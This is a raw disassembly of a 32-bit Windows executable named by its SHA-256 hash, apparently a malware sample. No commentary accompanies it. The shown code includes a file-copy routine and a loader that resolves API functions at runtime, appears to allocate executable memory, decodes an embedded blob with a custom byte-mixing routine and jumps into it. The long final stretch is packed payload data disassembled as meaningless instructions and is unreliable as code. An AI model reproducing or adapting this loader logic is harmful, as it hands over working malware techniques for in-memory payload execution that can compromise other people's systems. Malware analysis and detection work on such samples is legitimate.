
23055661c493312bcbbc2f41593d6949d42d8113dee5ccedb003e8af91213d1d.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0xf8
  411006:	push   esi
  411007:	mov    esi,DWORD PTR ds:0x42901c
  41100d:	push   edi
  41100e:	push   0x0
  411010:	push   0x80
  411015:	push   0x3
  411017:	push   0x0
  411019:	push   0x0
  41101b:	push   0x80000000
  411020:	push   0x4291e0
  411025:	call   esi
  411027:	mov    edi,eax
  411029:	cmp    edi,0xffffffff
  41102c:	mov    DWORD PTR [esp+0xc],edi
  411030:	je     0x41115f
  411036:	push   0x0
  411038:	push   0x80
  41103d:	push   0x4
  41103f:	push   0x0
  411041:	push   0x1
  411043:	push   0x4
  411045:	push   0x4291d8
  41104a:	call   esi
  41104c:	mov    esi,eax
  41104e:	cmp    esi,0xffffffff
  411051:	jne    0x411061
  411053:	pop    edi
  411054:	mov    eax,0x1
  411059:	pop    esi
  41105a:	add    esp,0xf8
  411060:	ret    
  411061:	push   ebx
  411062:	mov    ebx,DWORD PTR ds:0x429018
  411068:	push   ebp
  411069:	mov    ebp,DWORD PTR ds:0x429014
  41106f:	nop
  411070:	push   0x0
  411072:	lea    eax,[esp+0x14]
  411076:	push   eax
  411077:	push   0xc8
  41107c:	lea    ecx,[esp+0x4c]
  411080:	push   ecx
  411081:	push   edi
  411082:	call   DWORD PTR ds:0x429010
  411088:	test   eax,eax
  41108a:	je     0x4110d1
  41108c:	push   0x2
  41108e:	push   0x0
  411090:	push   0x0
  411092:	push   esi
  411093:	call   ebx
  411095:	mov    edx,DWORD PTR [esp+0x10]
  411099:	push   0x0
  41109b:	push   edx
  41109c:	push   0x0
  41109e:	mov    edi,eax
  4110a0:	push   edi
  4110a1:	push   esi
  4110a2:	call   ebp
  4110a4:	mov    ecx,DWORD PTR [esp+0x10]
  4110a8:	push   0x0
  4110aa:	lea    eax,[esp+0x1c]
  4110ae:	push   eax
  4110af:	push   ecx
  4110b0:	lea    edx,[esp+0x4c]
  4110b4:	push   edx
  4110b5:	push   esi
  4110b6:	call   DWORD PTR ds:0x42900c
  4110bc:	mov    eax,DWORD PTR [esp+0x10]
  4110c0:	push   0x0
  4110c2:	push   eax
  4110c3:	push   0x0
  4110c5:	push   edi
  4110c6:	push   esi
  4110c7:	call   DWORD PTR ds:0x429028
  4110cd:	mov    edi,DWORD PTR [esp+0x14]
  4110d1:	cmp    DWORD PTR [esp+0x10],0xc8
  4110d9:	je     0x411070
  4110db:	push   edi
  4110dc:	mov    edi,DWORD PTR ds:0x429040
  4110e2:	call   edi
  4110e4:	push   esi
  4110e5:	call   edi
  4110e7:	lea    ecx,[esp+0x1c]
  4110eb:	push   ecx
  4110ec:	call   DWORD PTR ds:0x429048
  4110f2:	mov    ecx,DWORD PTR [esp+0x38]
  4110f6:	xor    edx,edx
  4110f8:	mov    eax,0x21c00
  4110fd:	div    ecx
  4110ff:	mov    edi,DWORD PTR ds:0x429118
  411105:	lea    edx,[esp+0x40]
  411109:	mov    ebx,ecx
  41110b:	mov    esi,eax
  41110d:	imul   esi,ecx
  411110:	push   esi
  411111:	push   0x4291a0
  411116:	push   edx
  411117:	call   edi
  411119:	xor    edx,edx
  41111b:	mov    eax,0x21c00
  411120:	div    ebx
  411122:	lea    eax,[esp+0x4c]
  411126:	add    edx,0x400
  41112c:	push   edx
  41112d:	push   0x429178
  411132:	push   eax
  411133:	call   edi
  411135:	push   0x22000
  41113a:	lea    ecx,[esp+0x5c]
  41113e:	push   0x429148
  411143:	push   ecx
  411144:	call   edi
  411146:	mov    edx,0x21c00
  41114b:	sub    edx,esi
  41114d:	push   edx
  41114e:	lea    eax,[esp+0x68]
  411152:	push   0x429120
  411157:	push   eax
  411158:	call   edi
  41115a:	add    esp,0x30
  41115d:	pop    ebp
  41115e:	pop    ebx
  41115f:	pop    edi
  411160:	xor    eax,eax
  411162:	pop    esi
  411163:	add    esp,0xf8
  411169:	ret    
  41116a:	nop
  41116b:	nop
  41116c:	nop
  41116d:	nop
  41116e:	nop
  41116f:	nop
  411170:	sub    esp,0x8
  411173:	push   ebx
  411174:	push   ebp
  411175:	mov    ebp,DWORD PTR [esp+0x20]
  411179:	push   esi
  41117a:	xor    eax,eax
  41117c:	push   edi
  41117d:	mov    edi,DWORD PTR [esp+0x1c]
  411181:	mov    DWORD PTR [esp+0x10],eax
  411185:	mov    esi,0xfffffffd
  41118a:	mov    DWORD PTR [esp+0x14],0x1
  411192:	mov    ecx,DWORD PTR [esp+0x20]
  411196:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41119a:	add    esi,0x2
  41119d:	inc    esi
  41119e:	mov    BYTE PTR [esi+edi*1],cl
  4111a1:	movzx  edx,BYTE PTR [eax+ebp*1]
  4111a5:	mov    eax,DWORD PTR [esp+0x10]
  4111a9:	mov    ecx,DWORD PTR [esp+0x14]
  4111ad:	add    eax,ecx
  4111af:	mov    DWORD PTR [esp+0x10],eax
  4111b3:	shr    eax,cl
  4111b5:	mov    eax,DWORD PTR [esp+0x10]
  4111b9:	mov    ecx,eax
  4111bb:	shr    ecx,0x3
  4111be:	mov    ebx,0x1
  4111c3:	sub    ebx,ecx
  4111c5:	imul   eax,ebx
  4111c8:	mov    DWORD PTR [esp+0x10],eax
  4111cc:	shl    ebx,0x3
  4111cf:	mov    bl,BYTE PTR [esi+edi*1]
  4111d2:	mov    ecx,DWORD PTR [esp+0x24]
  4111d6:	add    bl,dl
  4111d8:	mov    BYTE PTR [esi+edi*1],bl
  4111db:	sub    esi,0x2
  4111de:	cmp    esi,ecx
  4111e0:	jl     0x411192
  4111e2:	pop    edi
  4111e3:	pop    esi
  4111e4:	pop    ebp
  4111e5:	pop    ebx
  4111e6:	add    esp,0x8
  4111e9:	ret    
  4111ea:	nop
  4111eb:	nop
  4111ec:	nop
  4111ed:	nop
  4111ee:	nop
  4111ef:	nop
  4111f0:	push   ebp
  4111f1:	mov    ebp,esp
  4111f3:	sub    esp,0x70
  4111f6:	mov    DWORD PTR [ebp-0x48],0x0
  4111fd:	mov    DWORD PTR [ebp-0x18],0x0
  411204:	mov    DWORD PTR [ebp-0x70],0x0
  41120b:	mov    DWORD PTR [ebp-0x60],0x0
  411212:	mov    DWORD PTR [ebp-0x8],0x0
  411219:	mov    DWORD PTR [ebp-0x6c],0x0
  411220:	mov    DWORD PTR [ebp-0x68],0x0
  411227:	mov    DWORD PTR [ebp-0x14],0x0
  41122e:	mov    DWORD PTR [ebp-0x4c],0x0
  411235:	mov    DWORD PTR [ebp-0x10],0x0
  41123c:	mov    DWORD PTR [ebp-0x58],0x0
  411243:	mov    DWORD PTR [ebp-0x4],0x0
  41124a:	mov    DWORD PTR [ebp-0x5c],0x0
  411251:	mov    DWORD PTR [ebp-0x30],0x0
  411258:	mov    DWORD PTR [ebp-0x54],0x0
  41125f:	mov    DWORD PTR [ebp-0x2c],0x0
  411266:	mov    DWORD PTR [ebp-0x50],0x0
  41126d:	mov    DWORD PTR [ebp-0xc],0x0
  411274:	mov    eax,ds:0x42920c
  411279:	mov    DWORD PTR [ebp-0x28],eax
  41127c:	mov    ecx,DWORD PTR ds:0x429210
  411282:	mov    DWORD PTR [ebp-0x24],ecx
  411285:	mov    edx,DWORD PTR ds:0x429214
  41128b:	mov    DWORD PTR [ebp-0x20],edx
  41128e:	mov    al,ds:0x429218
  411293:	mov    BYTE PTR [ebp-0x1c],al
  411296:	mov    ecx,DWORD PTR ds:0x4291fc
  41129c:	mov    DWORD PTR [ebp-0x40],ecx
  41129f:	mov    edx,DWORD PTR ds:0x429200
  4112a5:	mov    DWORD PTR [ebp-0x3c],edx
  4112a8:	mov    eax,ds:0x429204
  4112ad:	mov    DWORD PTR [ebp-0x38],eax
  4112b0:	mov    cx,WORD PTR ds:0x429208
  4112b7:	mov    WORD PTR [ebp-0x34],cx
  4112bb:	mov    dl,BYTE PTR ds:0x42920a
  4112c1:	mov    BYTE PTR [ebp-0x32],dl
  4112c4:	mov    DWORD PTR [ebp-0x30],0x40
  4112cb:	lea    eax,[ebp-0x10]
  4112ce:	push   eax
  4112cf:	push   0x4291e8
  4112d4:	call   DWORD PTR ds:0x429004
  4112da:	test   eax,eax
  4112dc:	je     0x411324
  4112de:	push   0x0
  4112e0:	push   0x0
  4112e2:	push   0x0
  4112e4:	call   DWORD PTR ds:0x429034
  4112ea:	mov    DWORD PTR [ebp-0x14],eax
  4112ed:	lea    ecx,[ebp-0x40]
  4112f0:	push   ecx
  4112f1:	lea    edx,[ebp-0x10]
  4112f4:	push   edx
  4112f5:	call   DWORD PTR ds:0x429000
  4112fb:	test   eax,eax
  4112fd:	je     0x411324
  4112ff:	mov    eax,DWORD PTR [ebp-0x10]
  411302:	add    eax,0x1
  411305:	mov    DWORD PTR [ebp-0x10],eax
  411308:	push   0x14
  41130a:	push   0x0
  41130c:	mov    ecx,DWORD PTR [ebp-0x14]
  41130f:	push   ecx
  411310:	call   DWORD PTR ds:0x429030
  411316:	push   0x0
  411318:	push   0x0
  41131a:	mov    edx,DWORD PTR [ebp-0x14]
  41131d:	push   edx
  41131e:	call   DWORD PTR ds:0x42902c
  411324:	mov    BYTE PTR [ebp-0x40],0x56
  411328:	call   DWORD PTR ds:0x429044
  41132e:	mov    DWORD PTR [ebp-0x2c],eax
  411331:	mov    BYTE PTR [ebp-0x3e],0x72
  411335:	movzx  eax,WORD PTR [ebp-0x2c]
  411339:	cmp    eax,0x539
  41133e:	jne    0x411380
  411340:	mov    BYTE PTR [ebp-0x34],0x0
  411344:	mov    DWORD PTR [ebp-0x14],0xe0d
  41134b:	lea    ecx,[ebp-0x28]
  41134e:	push   ecx
  41134f:	call   DWORD PTR ds:0x429024
  411355:	mov    DWORD PTR [ebp-0x60],eax
  411358:	mov    DWORD PTR [ebp-0x54],0x3a
  41135f:	lea    edx,[ebp-0x40]
  411362:	push   edx
  411363:	mov    eax,DWORD PTR [ebp-0x60]
  411366:	push   eax
  411367:	call   DWORD PTR ds:0x429020
  41136d:	mov    DWORD PTR [ebp-0x44],eax
  411370:	mov    DWORD PTR [ebp-0x8],0xc92bfd3f
  411377:	mov    DWORD PTR [ebp-0x68],0x10d93f
  41137e:	jmp    0x411395
  411380:	mov    BYTE PTR ds:0x444a58,0x0
  411387:	mov    BYTE PTR ds:0x42cb88,0x0
  41138e:	mov    BYTE PTR ds:0x442b18,0x0
  411395:	mov    DWORD PTR [ebp-0x2c],0x410000
  41139c:	push   DWORD PTR ds:0x429024
  4113a2:	pop    edx
  4113a3:	mov    DWORD PTR [ebp-0x6c],edx
  4113a6:	push   DWORD PTR [ebp-0x30]
  4113a9:	push   0x1000
  4113ae:	mov    eax,DWORD PTR [ebp-0x14]
  4113b1:	add    eax,0x23
  4113b4:	add    eax,0x23
  4113b7:	push   eax
  4113b8:	xor    eax,eax
  4113ba:	push   eax
  4113bb:	mov    ecx,DWORD PTR [ebp-0x44]
  4113be:	call   ecx
  4113c0:	push   eax
  4113c1:	pop    ecx
  4113c2:	mov    DWORD PTR [ebp-0x4],ecx
  4113c5:	mov    ecx,DWORD PTR [ebp-0x68]
  4113c8:	sub    ecx,0xdae0b
  4113ce:	mov    DWORD PTR [ebp-0x68],ecx
  4113d1:	cmp    DWORD PTR [ebp-0x4],0x0
  4113d5:	jne    0x4113de
  4113d7:	mov    BYTE PTR ds:0x442b18,0x0
  4113de:	mov    edx,DWORD PTR [ebp-0x4]
  4113e1:	add    edx,DWORD PTR [ebp-0x14]
  4113e4:	mov    eax,DWORD PTR [ebp-0x8]
  4113e7:	mov    DWORD PTR [edx],eax
  4113e9:	mov    ecx,DWORD PTR [ebp-0x4]
  4113ec:	add    ecx,DWORD PTR [ebp-0x54]
  4113ef:	mov    DWORD PTR [ebp-0x5c],ecx
  4113f2:	mov    edx,DWORD PTR ds:0x429020
  4113f8:	mov    DWORD PTR [ebp-0x4c],edx
  4113fb:	mov    eax,DWORD PTR [ebp-0x4]
  4113fe:	add    eax,DWORD PTR [ebp-0x14]
  411401:	mov    ecx,DWORD PTR [ebp+0x8]
  411404:	mov    DWORD PTR [eax+0x4],ecx
  411407:	mov    edx,DWORD PTR [ebp-0x4]
  41140a:	add    edx,DWORD PTR [ebp-0x14]
  41140d:	mov    DWORD PTR [ebp-0xc],edx
  411410:	cmp    DWORD PTR [ebp-0x68],0x0
  411414:	jbe    0x411431
  411416:	mov    eax,DWORD PTR [ebp-0xc]
  411419:	push   eax
  41141a:	mov    ecx,DWORD PTR [ebp-0x14]
  41141d:	push   ecx
  41141e:	mov    edx,DWORD PTR [ebp-0x2c]
  411421:	add    edx,DWORD PTR [ebp-0x68]
  411424:	push   edx
  411425:	mov    eax,DWORD PTR [ebp-0x4]
  411428:	push   eax
  411429:	call   0x411170
  41142e:	add    esp,0x10
  411431:	cmp    DWORD PTR [ebp-0x5c],0x0
  411435:	je     0x411448
  411437:	push   DWORD PTR [ebp-0x4c]
  41143a:	push   DWORD PTR [ebp-0x6c]
  41143d:	mov    edx,DWORD PTR [ebp-0x5c]
  411440:	push   eax
  411441:	jmp    edx
  411443:	jmp    0x422f1d
  411448:	mov    ecx,DWORD PTR [ebp+0x8]
  41144b:	mov    DWORD PTR [ebp-0x18],ecx
  41144e:	xchg   edx,eax
  41144f:	addr16 mov edi,0xc6b1cf9a
  411455:	repnz pop eax
  411457:	int3   
  411458:	and    DWORD PTR [eax-0x4950eaef],esp
  41145e:	popa   
  41145f:	sahf   
  411460:	retf   
  411461:	imul   esi,DWORD PTR ds:[edx-0x3a],0x8e94abc1
  411469:	jmp    0xaa802da
  41146e:	and    ebp,DWORD PTR [ecx+0x3a45630a]
  411474:	imul   edx,DWORD PTR [ecx-0x68],0x45
  411478:	dec    ebp
  411479:	bound  ebx,QWORD PTR [ebp+0x44]
  41147c:	scas   al,BYTE PTR es:[edi]
  41147d:	jne    0x411492
  41147f:	ins    BYTE PTR es:[edi],dx
  411480:	enter  0xa531,0xc5
  411484:	push   cs
  411485:	add    ah,BYTE PTR [eax-0x55]
  411488:	popf   
  411489:	sbb    al,0xd4
  41148b:	repnz pop edx
  41148d:	push   esi
  41148e:	mov    ah,0xad
  411490:	add    eax,0x4c913a5f
  411495:	add    bl,BYTE PTR [esi]
  411497:	mov    dh,al
  411499:	dec    esp
  41149a:	mov    ebx,0xc6d394e
  41149f:	fsubr  QWORD PTR [edi+0x42]
  4114a2:	xchg   ebx,eax
  4114a3:	scas   al,BYTE PTR es:[edi]
  4114a4:	sar    BYTE PTR [edi],0xc0
  4114a7:	push   esi
  4114a8:	cwde   
  4114a9:	mov    gs,WORD PTR [ebp+0x342081d7]
  4114af:	mov    bh,BYTE PTR [esi-0x17b9e276]
  4114b5:	into   
  4114b6:	add    dh,BYTE PTR [eax]
  4114b8:	out    0xd6,eax
  4114ba:	lods   eax,DWORD PTR ds:[esi]
  4114bb:	jne    0x4114ad
  4114bd:	jmp    0x56082d54
  4114c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114c3:	cmp    BYTE PTR [edx],cl
  4114c5:	sbb    dh,BYTE PTR [edi+ebp*8-0x1e]
  4114c9:	or     eax,0xde936f5
  4114ce:	mov    cl,0xee
  4114d0:	sbb    eax,0x60350bc1
  4114d5:	sub    DWORD PTR [eax],esi
  4114d7:	xchg   ecx,eax
  4114d8:	adc    bh,BYTE PTR [eax+edx*4]
  4114db:	and    DWORD PTR [ecx],0xffffffc9
  4114de:	nop
  4114df:	scas   eax,DWORD PTR es:[edi]
  4114e0:	iret   
  4114e1:	jae    0x41149c
  4114e3:	cs stc 
  4114e5:	dec    eax
  4114e6:	pop    edx
  4114e7:	xor    BYTE PTR [edi-0x77],ch
  4114ea:	push   0xffffffa9
  4114ec:	test   eax,0x1779492b
  4114f1:	outs   dx,DWORD PTR ds:[esi]
  4114f2:	xchg   edx,eax
  4114f3:	fnstsw WORD PTR [ebx]
  4114f5:	mov    ecx,0x14460770
  4114fa:	jo     0x41150f
  4114fc:	pop    esp
  4114fd:	jae    0x411546
  4114ff:	jge    0x41152d
  411501:	sbb    al,0xe1
  411503:	(bad)  
  411504:	mov    ah,0xa2
  411506:	inc    ebp
  411507:	div    BYTE PTR [ebx-0x494fb740]
  41150d:	pusha  
  41150e:	xor    eax,0x2ec913d5
  411513:	xchg   DWORD PTR [ebx],ebx
  411515:	cmp    BYTE PTR [ebp+0x25],ah
  411518:	pop    eax
  411519:	fcmovnb st,st(0)
  41151b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41151c:	fs ret 0x10e3
  411520:	outs   dx,DWORD PTR ds:[esi]
  411521:	push   edi
  411522:	hlt    
  411523:	push   cs
  411524:	fwait
  411525:	call   0x5f8b:0x3316da28
  41152c:	jecxz  0x4115ad
  41152e:	jp     0x4114b8
  411530:	lock add DWORD PTR [edx+0xa],0xffffffb3
  411535:	out    dx,eax
  411536:	shr    BYTE PTR [ebx+0x18e26451],1
  41153c:	push   esi
  41153d:	push   es
  41153e:	inc    eax
  41153f:	jge    0x411547
  411541:	and    DWORD PTR [eax],edi
  411543:	les    eax,FWORD PTR [eax+0x7a9fbe7e]
  411549:	mov    edi,0x8e6e9e1e
  41154e:	jp     0x411531
  411550:	mov    eax,0x31dfbe6c
  411555:	cmp    al,0x67
  411557:	fsub   QWORD PTR [ebp+esi*8+0x3d]
  41155b:	add    cl,BYTE PTR [eax+0x70]
  41155e:	mov    DWORD PTR [esi],esi
  411560:	rol    DWORD PTR [ecx+0x47],cl
  411563:	mov    al,0x82
  411565:	mov    esp,0xa71603a2
  41156a:	xor    DWORD PTR [ecx-0x2fafdc0e],eax
  411570:	mov    ah,BYTE PTR [eax-0x144b1f30]
  411576:	mov    eax,ds:0xd2e83108
  41157b:	jl     0x4115d8
  41157d:	lahf   
  41157e:	cmp    al,0xab
  411580:	sbb    eax,0x37fcb479
  411585:	iret   
  411586:	jp     0x411604
  411588:	xor    DWORD PTR [ecx],edi
  41158a:	frstor [ecx]
  41158c:	add    ebp,DWORD PTR [ebx-0x7a]
  41158f:	push   ss
  411590:	nop
  411591:	adc    eax,0xfa800c1b
  411596:	(bad)  
  411597:	dec    esp
  411598:	pop    ebx
  411599:	push   0xffffffcf
  41159b:	data16 dec BYTE PTR [esi+edx*4-0x4e]
  4115a0:	add    dl,BYTE PTR [edx]
  4115a2:	(bad)  [edx+0x4d]
  4115a5:	aam    0x4d
  4115a7:	lahf   
  4115a8:	or     al,0x25
  4115aa:	and    bl,BYTE PTR [ecx-0x3413f06f]
  4115b0:	daa    
  4115b1:	adc    dl,al
  4115b3:	ret    0x513e
  4115b6:	aaa    
  4115b7:	and    ebx,DWORD PTR ds:0x41e5b514
  4115bd:	adc    eax,0xd2bcae49
  4115c2:	ss pop ds
  4115c4:	retf   
  4115c5:	test   al,0x6f
  4115c7:	loope  0x41156a
  4115c9:	push   ecx
  4115ca:	sbb    BYTE PTR [edx],bh
  4115cc:	push   cs
  4115cd:	dec    eax
  4115ce:	cdq    
  4115cf:	imul   ecx,ecx,0x8282a6e6
  4115d5:	stos   DWORD PTR es:[edi],eax
  4115d6:	(bad)  
  4115d7:	out    dx,al
  4115d8:	xchg   ebx,eax
  4115d9:	xchg   ecx,eax
  4115da:	mov    ecx,eax
  4115dc:	add    al,0x80
  4115de:	fistp  DWORD PTR [ebp+0x6f]
  4115e1:	leave  
  4115e2:	int    0xf1
  4115e4:	or     DWORD PTR [ebx],0x2
  4115e7:	and    dh,ah
  4115e9:	ja     0x4115a9
  4115eb:	(bad)  
  4115ec:	cmp    BYTE PTR [ebx-0x2f],ch
  4115ef:	popf   
  4115f0:	xchg   ebx,eax
  4115f1:	mov    edi,0xeee0e8aa
  4115f6:	sbb    BYTE PTR [edx+0x5cba0542],dl
  4115fc:	mov    dh,0xd6
  4115fe:	add    eax,0x3bffa5a9
  411603:	nop
  411604:	sbb    DWORD PTR ds:[eax+0x73],ecx
  411608:	cmp    bl,BYTE PTR [ecx+ebp*2]
  41160b:	imul   ecx,DWORD PTR ss:[esi+0x5f45eb67],0x5f220f65
  411616:	sbb    bh,bh
  411618:	jecxz  0x4115ec
  41161a:	loopne 0x411663
  41161c:	push   es
  41161d:	gs push 0x15
  411620:	test   ebp,eax
  411622:	inc    ecx
  411623:	(bad)  
  411624:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411625:	xchg   edx,eax
  411626:	sub    eax,0xab11dc17
  41162b:	(bad)  
  41162c:	ss loope 0x4116a4
  41162f:	pop    es
  411630:	sub    eax,0xe499629a
  411635:	(bad)  
  411637:	int3   
  411638:	dec    esi
  411639:	je     0x411696
  41163b:	adc    eax,DWORD PTR [ebx+0x3ebc65d1]
  411641:	cld    
  411642:	in     eax,0x50
  411644:	arpl   bp,cx
  411646:	call   DWORD PTR [esi]
  411648:	inc    edx
  411649:	inc    esi
  41164a:	les    esi,FWORD PTR [eax+0x48]
  41164d:	xor    ebx,eax
  41164f:	jnp    0x41160c
  411651:	jmp    0x41166c
  411653:	test   DWORD PTR [ebp-0x89e0f8],esp
  411659:	enter  0xb53a,0x58
  41165d:	or     al,0x82
  41165f:	shl    BYTE PTR [ebp+0x48],cl
  411662:	repnz sub eax,0x3cb53cba
  411668:	out    0xc7,al
  41166a:	inc    ebx
  41166b:	popf   
  41166c:	mov    eax,ds:0x2b10b9b
  411671:	sbb    DWORD PTR [ecx-0x4e],edi
  411674:	ins    BYTE PTR es:[edi],dx
  411675:	inc    eax
  411676:	and    al,0x87
  411678:	lods   eax,DWORD PTR ds:[esi]
  411679:	push   edi
  41167a:	dec    ebx
  41167b:	dec    eax
  41167c:	pop    ecx
  41167d:	call   0x4864:0x883f24bf
  411684:	mov    ?,ebp
  411686:	cmp    BYTE PTR [edi-0x20336b7d],bh
  41168c:	ins    BYTE PTR es:[edi],dx
  41168d:	ss sub edx,esi
  411690:	out    dx,eax
  411691:	xor    bl,BYTE PTR [eax-0x5dd4b36b]
  411697:	pop    ss
  411698:	sahf   
  411699:	fwait
  41169a:	(bad)  
  41169b:	loopne 0x4116c3
  41169d:	inc    eax
  41169e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41169f:	shl    BYTE PTR [ebp+0x59],0xa0
  4116a3:	fsubr  st(0),st
  4116a5:	aam    0x58
  4116a7:	mov    WORD PTR [ebp-0x29dca40],ds
  4116ad:	dec    DWORD PTR gs:[ecx]
  4116b0:	fsub   QWORD PTR [ecx]
  4116b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116b3:	loopne 0x41170d
  4116b5:	clc    
  4116b6:	pop    ds
  4116b7:	les    eax,FWORD PTR [ebx]
  4116b9:	xor    ebx,ecx
  4116bb:	jae    0x4116ea
  4116bd:	add    DWORD PTR [esi],esp
  4116bf:	mov    cl,0x22
  4116c1:	(bad)  
  4116c2:	and    al,0x3a
  4116c4:	or     DWORD PTR [esi],ecx
  4116c6:	add    cl,dl
  4116c8:	cmp    DWORD PTR [edi],0xf03e9d6a
  4116ce:	cmp    al,0xbe
  4116d0:	addr16 sbb eax,0xa274627c
  4116d6:	or     DWORD PTR [esi-0x7],edx
  4116d9:	pop    es
  4116da:	out    0x43,eax
  4116dc:	dec    esi
  4116dd:	call   0x37c1a69a
  4116e2:	mov    bl,0x94
  4116e4:	lahf   
  4116e5:	(bad)  
  4116e6:	sbb    DWORD PTR [ecx],esi
  4116e8:	push   esi
  4116e9:	xchg   esi,eax
  4116ea:	data16 sub dh,BYTE PTR [edx+0x5e0875e2]
  4116f1:	call   0x493aabec
  4116f6:	aaa    
  4116f7:	push   ecx
  4116f8:	icebp  
  4116f9:	dec    ebp
  4116fa:	pop    ecx
  4116fb:	lock dec ebx
  4116fd:	test   DWORD PTR [esi-0xb6a63eb],edi
  411703:	pop    ebp
  411704:	mov    esp,0x6d7274c8
  411709:	sub    ebp,DWORD PTR [esi]
  41170b:	xchg   ebx,eax
  41170c:	mov    ebx,0xcceb5825
  411711:	add    BYTE PTR [edx-0x57],dh
  411714:	repnz cs mov edi,0x610758da
  41171b:	inc    edi
  41171c:	enter  0x7f08,0xe8
  411720:	jmp    0x818f066a
  411725:	adc    DWORD PTR [esi-0x35],esi
  411728:	fld    DWORD PTR [ecx-0x5d27f831]
  41172e:	pop    esp
  41172f:	dec    esp
  411730:	bound  eax,QWORD PTR [ebx+0x56]
  411733:	push   ebx
  411734:	sbb    ebx,DWORD PTR [edi]
  411736:	push   edx
  411737:	push   ecx
  411738:	arpl   WORD PTR ds:0x8b35ff0,sp
  41173e:	mov    eax,ds:0x35002b65
  411743:	xchg   ecx,eax
  411744:	out    0x97,eax
  411746:	loopne 0x411747
  411748:	(bad)  
  411749:	dec    ebx
  41174a:	inc    ebp
  41174b:	outs   dx,DWORD PTR ds:[esi]
  41174c:	fdiv   QWORD PTR ds:[ebx+0x51]
  411750:	aas    
  411751:	mov    dl,BYTE PTR [esi+0x56469a92]
  411757:	inc    ebx
  411758:	add    BYTE PTR ds:0x76181966,ch
  41175e:	xchg   BYTE PTR [esi],cl
  411760:	popa   
  411761:	mov    dl,0xdb
  411763:	leave  
  411764:	inc    esp
  411765:	in     al,dx
  411766:	xchg   ecx,eax
  411767:	cmp    BYTE PTR [ecx],0xf6
  41176a:	frstor [ebx-0x529e31fe]
  411770:	ret    0x5a2d
  411773:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411774:	mov    ds:0xe7812ad9,al
  411779:	dec    ebx
  41177a:	jg     0x4116fc
  41177c:	lock push es
  41177e:	scas   al,BYTE PTR es:[edi]
  41177f:	cdq    
  411780:	jmp    0x411742
  411782:	mov    ecx,0x7e57904c
  411787:	add    al,0xea
  411789:	and    dh,BYTE PTR [edi+edi*1+0x4c]
  41178d:	std    
  41178e:	inc    eax
  41178f:	popf   
  411790:	push   cs
  411791:	jbe    0x41171c
  411793:	addr16 mov ebp,0x58335111
  411799:	mov    esi,0xa98b9852
  41179e:	mov    ah,0xd7
  4117a0:	mov    eax,0xec56e8fa
  4117a5:	push   ebx
  4117a6:	inc    edx
  4117a7:	sub    eax,0x675cc08c
  4117ac:	and    al,0xe0
  4117ae:	inc    edx
  4117af:	(bad)  
  4117b1:	popf   
  4117b2:	lock pop eax
  4117b4:	inc    esi
  4117b5:	mov    dl,0xbf
  4117b7:	and    edi,DWORD PTR [ecx+0x28]
  4117ba:	shr    BYTE PTR ds:0x926fded7,0xb6
  4117c1:	cwde   
  4117c2:	frstpm(287 only) 
  4117c4:	call   0xcf78fd2f
  4117c9:	cmp    BYTE PTR [ecx],0x3c
  4117cc:	inc    ebx
  4117cd:	frstor [ebx]
  4117cf:	fdivr  DWORD PTR [edi+edi*8+0x544313b5]
  4117d6:	inc    ebx
  4117d7:	ins    BYTE PTR es:[edi],dx
  4117d8:	adc    al,0xf8
  4117da:	add    esi,esp
  4117dc:	retf   0x287d
  4117df:	or     BYTE PTR [ebp+0x50],dh
  4117e2:	xchg   ch,cl
  4117e4:	sub    DWORD PTR [eax-0x11331f35],edx
  4117ea:	mov    WORD PTR [esi],fs
  4117ec:	repz mov edi,0xf0af89be
  4117f2:	ins    DWORD PTR es:[edi],dx
  4117f3:	push   esi
  4117f4:	fdiv   DWORD PTR [eax+0x24]
  4117f7:	bound  esi,QWORD PTR [edx-0x4ca8325f]
  4117fd:	iret   
  4117fe:	cli    
  4117ff:	or     al,0x0
  411801:	stc    
  411802:	dec    ebx
  411803:	ins    DWORD PTR es:[edi],dx
  411804:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411805:	xchg   ebx,eax
  411806:	adc    eax,DWORD PTR ds:0xdfa0fc9
  41180c:	jae    0x41179e
  41180e:	xchg   esi,eax
  41180f:	in     eax,0xe2
  411811:	fadd   DWORD PTR [esp+ecx*4-0x1]
  411815:	div    BYTE PTR [esi]
  411817:	cmp    BYTE PTR [eax],bh
  411819:	pop    DWORD PTR [ecx+0x60f0c9a4]
  41181f:	or     BYTE PTR [esi+edx*4-0x61],ah
  411823:	dec    edx
  411824:	mov    ch,BYTE PTR [ebx+0x2169141b]
  41182a:	xchg   esi,eax
  41182b:	inc    esp
  41182c:	gs xchg ebp,eax
  41182e:	jae    0x411866
  411830:	mov    ch,0x73
  411832:	(bad)  
  411833:	cld    
  411834:	sti    
  411835:	sar    BYTE PTR [edx+eiz*4+0x16],1
  411839:	sbb    eax,0xde4474a2
  41183e:	inc    edi
  41183f:	stos   DWORD PTR es:[edi],eax
  411840:	loop   0x411800
  411842:	push   eax
  411843:	repz dec ebp
  411845:	jle    0x4118c2
  411847:	dec    ebx
  411848:	xchg   bh,ch
  41184a:	daa    
  41184b:	adc    DWORD PTR [edi+0x6c16f198],ebx
  411851:	retf   0xfc0
  411854:	je     0x411823
  411856:	sbb    BYTE PTR [eax+0x219c3b0e],bh
  41185c:	adc    cl,cl
  41185e:	pop    ds
  41185f:	(bad)  
  411860:	repnz pop ecx
  411862:	xchg   BYTE PTR [edx+eax*1],al
  411865:	adc    al,0x72
  411867:	dec    edx
  411868:	dec    ecx
  411869:	and    eax,0x40bd8009
  41186e:	mov    esi,0x2c6dbebc
  411873:	in     eax,dx
  411874:	mov    al,ds:0x95b25643
  411879:	call   0xa8fe3d2c
  41187e:	push   edi
  41187f:	ins    DWORD PTR es:[edi],dx
  411880:	sar    BYTE PTR [esp+ebx*8-0x797d065b],0x52
  411888:	inc    esi
  411889:	pop    es
  41188a:	mov    bl,0x7a
  41188c:	pop    edi
  41188d:	ss cld 
  41188f:	xchg   ebx,eax
  411890:	jns    0x41182c
  411892:	hlt    
  411893:	jmp    0x919d:0x8af449a
  41189a:	adc    BYTE PTR [esi+0x71a1f3db],0x5a
  4118a1:	jmp    0x49ae:0xb2252bd2
